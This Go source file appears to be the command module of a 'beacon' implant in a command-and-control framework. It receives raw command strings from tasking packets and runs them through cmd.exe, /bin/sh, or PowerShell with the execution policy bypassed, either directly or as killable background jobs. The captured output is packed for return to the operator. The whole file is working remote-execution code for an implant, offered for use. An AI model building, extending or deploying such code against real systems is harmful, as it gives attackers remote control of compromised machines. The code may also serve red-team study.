package command

import (
	"beacon/pkg/jobs"
	"beacon/pkg/utils/encoding"
	"beacon/pkg/utils/packet"
	"bytes"
	"fmt"
	"os/exec"
	"runtime"
)

func readRawCommand(p *packet.Parser, name string) (string, error) {
	argCount := p.ParseInt32()
	if p.HasError() {
		return "", p.Error()
	}
	if argCount != 1 {
		return "", fmt.Errorf("%s expects exactly 1 raw command string, got %d; do not split by spaces", name, argCount)
	}

	raw := p.ParseString()
	if p.HasError() {
		return "", p.Error()
	}
	if p.Size() != 0 {
		return "", fmt.Errorf("%s payload has trailing bytes after raw command", name)
	}
	if raw == "" {
		return "", fmt.Errorf("%s requires a raw command string", name)
	}
	return raw, nil
}

func StartShellJob(manager *jobs.Manager, sink func([]byte), taskID uint32, commandID uint32, p *packet.Parser, acp int, powershell bool) ([]byte, error) {
	raw, err := readRawCommand(p, shellName(powershell))
	if err != nil {
		return nil, err
	}
	if manager == nil {
		return nil, fmt.Errorf("job manager is not initialized")
	}

	name := shellName(powershell)
	job, err := manager.Create(taskID, commandID, jobs.TypeProcess, name)
	if err != nil {
		return nil, err
	}

	manager.Start(job, func(job *jobs.Job) {
		payload := runCommandCapture(job, raw, acp, powershell)
		if sink != nil {
			sink(packet.MakeFinalPacket(taskID, commandID, payload))
		}
	})

	return packet.PackArray([]any{[]byte(fmt.Sprintf("Job %d started: %s", taskID, name))})
}

func runCommandCapture(job *jobs.Job, raw string, acp int, powershell bool) []byte {
	var cmd *exec.Cmd
	if powershell {
		cmd = exec.CommandContext(job.Context(), "powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", raw)
	} else if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(job.Context(), "cmd.exe", "/c", raw)
	} else {
		cmd = exec.CommandContext(job.Context(), "/bin/sh", "-c", raw)
	}

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	if err := cmd.Start(); err != nil {
		return packExecText(fmt.Sprintf("Error: %v", err))
	}
	job.SetProcess(cmd.Process)

	err := cmd.Wait()

	finalOutput := encoding.ConvertCpToUTF8(out.String(), acp)
	if job.Context().Err() != nil {
		return packExecText("Job killed")
	}
	if err != nil {
		return packExecText(fmt.Sprintf("Error: %v\nOutput: %s", err, finalOutput))
	}
	return packExecText(finalOutput)
}

func shellName(powershell bool) string {
	if powershell {
		return "powershell"
	}
	return "shell"
}

func packExecText(text string) []byte {
	out, _ := packet.PackArray([]any{[]byte(text)})
	return out
}

// Shell 自动识别操作系统并执行命令
func Shell(p *packet.Parser, acp int) ([]byte, error) {
	raw, err := readRawCommand(p, "shell")
	if err != nil {
		return nil, err
	}
	fmt.Printf("[DEBUG] Shell raw command: %s\n", raw)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/c", raw)
	} else {
		cmd = exec.Command("/bin/sh", "-c", raw)
	}

	// 合并多流输出
	output, err := cmd.CombinedOutput()

	// 对输出进行转码：系统编码 -> UTF-8
	finalOutput := encoding.ConvertCpToUTF8(string(output), acp)

	if err != nil {
		return packet.PackArray([]any{[]byte(fmt.Sprintf("Error: %v\nOutput: %s", err, finalOutput))})
	}

	return packet.PackArray([]any{[]byte(finalOutput)})
}

// PowerShell 使用绕过策略执行命令
func PowerShell(p *packet.Parser, acp int) ([]byte, error) {
	raw, err := readRawCommand(p, "powershell")
	if err != nil {
		return nil, err
	}
	fmt.Printf("[DEBUG] PowerShell raw command: %s\n", raw)

	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", raw)

	output, err := cmd.CombinedOutput()

	// 对输出进行转码：系统编码 -> UTF-8
	finalOutput := encoding.ConvertCpToUTF8(string(output), acp)

	if err != nil {
		return packet.PackArray([]any{[]byte(fmt.Sprintf("Error: %v\nOutput: %s", err, finalOutput))})
	}

	return packet.PackArray([]any{[]byte(finalOutput)})
}
